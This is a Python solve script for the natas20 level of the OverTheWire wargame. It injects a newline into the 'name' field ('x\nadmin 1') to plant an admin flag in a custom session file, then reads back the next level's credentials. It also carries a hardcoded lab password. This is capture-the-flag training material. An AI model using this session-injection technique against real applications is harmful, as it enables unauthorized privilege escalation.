import urllib.request, urllib.parse, base64, http.cookiejar
# natas20: custom session store. mywrite writes "key value\n" lines; myread
# splits each line on the FIRST space. A newline injected in the name adds an
# "admin 1" line; reloading the session makes $_SESSION["admin"]=1.
url = "http://natas20.natas.labs.overthewire.org/"
auth = "Basic " + base64.b64encode(b"natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao").decode()
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
def req(data=None):
    r = urllib.request.Request(url, data=data, headers={"Authorization": auth})
    return op.open(r, timeout=15).read().decode("utf-8", "replace")
# request 1: inject the admin line into the session file
body = req(urllib.parse.urlencode({"name": "x\nadmin 1"}).encode())
print("after inject: admin" in body or "injected")
# request 2: same cookie reloads the file -> admin=1 -> credentials
body = req()
print(body)

